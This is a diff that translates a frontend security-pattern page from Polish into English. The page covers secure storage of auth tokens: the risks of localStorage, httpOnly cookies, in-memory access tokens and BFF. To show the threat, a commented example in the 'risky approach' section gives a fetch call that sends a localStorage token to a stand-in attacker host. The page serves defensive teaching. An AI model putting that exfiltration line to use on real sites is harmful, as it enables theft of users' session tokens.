@@ -1,51 +1,51 @@
 # Secure Token Storage
 
-> **Spis treści:** Metadane · TLDR · Uwagi (stan 2026, poprawki względem źródła) · Problem · Rozwiązanie · Przykłady kodu · Zalety · Wady / tradeoffs · Powiązane wzorce · Kiedy używać / kiedy NIE używać
+> **Contents:** Metadata · TLDR · Notes (state in 2026, corrections to the source) · Problem · Solution · Code examples · Advantages · Disadvantages / tradeoffs · Related patterns · When to use / when NOT to use
 
-Źródło: frontendpatterns.dev/secure-token-storage.
+Source: frontendpatterns.dev/secure-token-storage.
 
-## Metadane
+## Metadata
 
-Kategoria: Security. Poziom: Advanced. Framework: Native web. Autor: Den Odell. Data aktualizacji:
-21 czerwca 2026.
+Category: Security. Level: Advanced. Framework: Native web. Author: Den Odell. Last updated:
+21 June 2026.
 
 ## TLDR
 
-Nigdy nie przechowuj długotrwałych tokenów autentykacji w `localStorage`/`sessionStorage` — użyj
-httpOnly cookies dla tokenów sesji/odświeżania i tokenu dostępu w pamięci (in-memory) dla SPA.
+Never store long-lived authentication tokens in `localStorage`/`sessionStorage` — use
+httpOnly cookies for session/refresh tokens and an in-memory access token for an SPA.
 
-## Uwagi (stan 2026, poprawki względem źródła)
+## Notes (state in 2026, corrections to the source)
 
-- Rekomendacja IETF „OAuth 2.0 for Browser-Based Apps” (2025): najbezpieczniejszy jest wzorzec **BFF**
-  (Backend-for-Frontend) — tokeny OAuth w ogóle nie trafiają do przeglądarki, a SPA ma tylko ciasteczko sesji
-  `HttpOnly; Secure; SameSite` do własnego backendu. Token w pamięci (przykład niżej) to kompromis dla SPA bez BFF.
-- XSS w aplikacji z tokenem w pamięci nadal może wykonywać żądania w imieniu użytkownika — to ogranicza kradzież
-  tokenu, nie skutki XSS.
-- Wiele równoległych 401 → jedno odświeżenie: trzymaj współdzieloną obietnicę `refreshPromise`, inaczej wyścig
-  refresh tokenów (przy rotacji) wyloguje użytkownika.
-- Po stronie serwera (wydawanie, rotacja, JWT) — be-auth-security.
+- The IETF recommendation "OAuth 2.0 for Browser-Based Apps" (2025): the safest is the **BFF** pattern
+  (Backend-for-Frontend) — OAuth tokens never reach the browser at all, and the SPA has only an
+  `HttpOnly; Secure; SameSite` session cookie to its own backend. A token in memory (the example below) is a compromise for an SPA without a BFF.
+- XSS in an application with a token in memory can still make requests on behalf of the user — this limits token
+  theft, not the consequences of XSS.
+- Many parallel 401s → one refresh: keep a shared `refreshPromise` promise, otherwise a race of
+  refresh tokens (with rotation) will log the user out.
+- The server side (issuing, rotation, JWT) — be-auth-security.
 
 ## Problem
 
-Przechowywanie tokenów autentykacji w `localStorage` lub `sessionStorage` stanowi poważne
-zagrożenie bezpieczeństwa. Cokolwiek przechowywane w `localStorage`/`sessionStorage` jest czytelne
-dla **każdego** JavaScriptu działającego na stronie — obejmuje to złośliwe skrypty wstrzyknięte
-przez XSS, skompromitowane tagi analityczne albo rozszerzenia przeglądarki. Pojedynczy wiersz kodu
-wystarczy, by token trafił do serwera atakującego, a użytkownik pozostaje nieświadomy.
+Storing authentication tokens in `localStorage` or `sessionStorage` is a serious
+security threat. Anything stored in `localStorage`/`sessionStorage` is readable
+by **any** JavaScript running on the page — this includes malicious scripts injected
+through XSS, compromised analytics tags or browser extensions. A single line of code
+is enough for the token to reach the attacker's server, while the user remains unaware.
 
-## Rozwiązanie
+## Solution
 
-Trójwarstwowy model ochrony:
+A three-layer protection model:
 
-1. **httpOnly cookies** dla tokenów sesji i odświeżania — niewidoczne dla JavaScript, wysyłane
-   automatycznie przez przeglądarkę.
-2. **Flagi `Secure` i `SameSite`** — transmisja wyłącznie przez HTTPS + ochrona przed CSRF.
-3. **In-memory access token** dla SPA — krótkotrwały token przechowywany w zmiennej zamknięcia
-   (closure), nigdy na dysku.
+1. **httpOnly cookies** for session and refresh tokens — invisible to JavaScript, sent
+   automatically by the browser.
+2. **The `Secure` and `SameSite` flags** — transmission only over HTTPS + protection against CSRF.
+3. **An in-memory access token** for an SPA — a short-lived token kept in a closure
+   variable, never on disk.
 
-## Przykłady kodu
+## Code examples
 
-### Podejście ryzykowne (do uniknięcia)
+### The risky approach (to avoid)
 
 ```javascript
 // DON'T DO THIS. localStorage is readable by any JavaScript on the page,
@@ -56,7 +56,7 @@ localStorage.setItem('token', jwt);
 //   fetch('https://evil.example/steal?t=' + localStorage.getItem('token'));
 ```
 
-### Ustawianie httpOnly cookie na serwerze (Express.js)
+### Setting an httpOnly cookie on the server (Express.js)
 
 ```javascript
 // Express route handler
@@ -79,7 +79,7 @@ app.post('/login', async (req, res) => {
 // The server reads it from req.cookies.session to authenticate.
 ```
 
-### Access token w pamięci (SPA client)
+### An access token in memory (SPA client)
 
 ```javascript
 // auth.js — the access token lives only in this closure variable,
@@ -124,48 +124,48 @@ export async function authedFetch(url, options = {}) {
 }
 ```
 
-## Zalety
+## Advantages
 
-- Ciasteczka httpOnly są niedostępne dla skryptów — ataki XSS nie mogą bezpośrednio odczytać tokena.
-- Automatyczne wysyłanie przez przeglądarkę eliminuje ręczne zarządzanie tokenem po stronie klienta.
-- Flaga `Secure` chroni transmisję, `SameSite` blokuje typowe wektory CSRF.
-- Token dostępu w pamięci ogranicza okno ekspozycji XSS do kilku minut ważności tokenu.
-- Refresh token nigdy nie jest osiągalny dla wstrzykniętych skryptów.
-- Przeładowanie strony kasuje token z pamięci — skradziona (np. przez inspekcję) sesja nie
-  pozostawia użytecznego tokenu trwałego.
-- Integracja ze standardowymi frameworkami backendowymi jest prosta.
+- httpOnly cookies are inaccessible to scripts — XSS attacks cannot read the token directly.
+- Automatic sending by the browser eliminates manual token management on the client side.
+- The `Secure` flag protects the transmission, `SameSite` blocks typical CSRF vectors.
+- An in-memory access token limits the XSS exposure window to the few minutes of the token's validity.
+- The refresh token is never reachable for injected scripts.
+- A page reload clears the token from memory — a session stolen (e.g. through inspection) does not
+  leave a usable persistent token.
+- Integration with standard backend frameworks is simple.
 
-## Wady / tradeoffs
+## Disadvantages / tradeoffs
 
-- Wymaga kontroli nad backendem i dedykowanego endpointu autentykacji (`/api/refresh`).
-- Nadal konieczna ochrona CSRF (flagi, tokeny, double-submit) — cookies rozwiązują kradzież
-  tokenu, nie fałszerstwo żądania.
-- Token dostępu traci się przy przeładowaniu strony — wymaga zbudowania cichego mechanizmu
-  odświeżania.
-- Lokalne testowanie komplikuje wymóg HTTPS dla flagi `Secure`.
-- Limit rozmiaru ciasteczka (~4 KB) może spowodować przepełnienie przy dużych tokenach.
-- Interfejsy między domenami wymagają `SameSite=None; Secure` i poprawnej konfiguracji CORS.
-- Aplikacje mobilne i klienci spoza przeglądarki nie dostają automatycznej obsługi cookies —
-  wymagają innego schematu.
-- Token dostępu w pamięci wciąż wymaga obrony przed XSS (output encoding, CSP, zaufane
-  zależności) — to zmniejsza okno ryzyka, nie eliminuje go całkowicie.
+- Requires control over the backend and a dedicated authentication endpoint (`/api/refresh`).
+- CSRF protection is still necessary (flags, tokens, double-submit) — cookies solve token
+  theft, not request forgery.
+- The access token is lost on a page reload — a silent refresh mechanism
+  must be built.
+- Local testing is complicated by the HTTPS requirement of the `Secure` flag.
+- The cookie size limit (~4 KB) can cause an overflow with large tokens.
+- Cross-domain interfaces require `SameSite=None; Secure` and a correct CORS configuration.
+- Mobile applications and non-browser clients do not get automatic cookie handling —
+  they require a different scheme.
+- An in-memory access token still requires defence against XSS (output encoding, CSP, trusted
+  dependencies) — it reduces the risk window, it does not eliminate it completely.
 
-## Powiązane wzorce
+## Related patterns
 
 - CSRF Protection — Security (`csrf-protection.md`)
 - SameSite Cookie — Security (`samesite-cookie.md`)
-- Patrz też be-auth-security — sekcja o JWT/algorytmie i
-  timing-safe comparison dotyczy backendu wydającego te tokeny, ten plik dotyczy przechowywania
-  ich po stronie frontendu.
-- Zewnętrzne: Web Storage Security (MDN), JWT Storage Best Practices (Auth0), Secure Cookie
+- See also be-auth-security — the section on JWT/the algorithm and
+  timing-safe comparison concerns the backend that issues these tokens; this file concerns storing
+  them on the frontend side.
+- External: Web Storage Security (MDN), JWT Storage Best Practices (Auth0), Secure Cookie
   Attributes (OWASP).
 
-## Kiedy używać / kiedy NIE używać
+## When to use / when NOT to use
 
-Stosuj httpOnly cookie + in-memory access token **zawsze**, gdy budujesz własną autentykację
-sesyjną dla aplikacji webowej z przeglądarką jako klientem — to jest dziś rekomendowany standard,
-nie jedna z opcji do rozważenia. **Nie** stosuj tego wzorca 1:1 dla aplikacji mobilnych/natywnych
-klientów API bez przeglądarki — tam cookies nie są naturalnym mechanizmem transportu i potrzebny
-jest inny model (np. secure storage systemu operacyjnego + refresh token rotation). Jeśli projekt
-już używa zewnętrznego dostawcy identity (Auth0, Clerk, Firebase Auth) — sprawdź najpierw, jaki
-model przechowywania on narzuca/rekomenduje, zamiast budować to samodzielnie od zera.
+Apply an httpOnly cookie + an in-memory access token **always** when you build your own session
+authentication for a web application with the browser as the client — this is today's recommended standard,
+not one of the options to consider. Do **not** apply this pattern 1:1 to mobile/native
+API clients without a browser — there cookies are not a natural transport mechanism and a different
+model is needed (e.g. the operating system's secure storage + refresh token rotation). If the project
+already uses an external identity provider (Auth0, Clerk, Firebase Auth) — first check what
+storage model it imposes/recommends, instead of building it yourself from scratch.
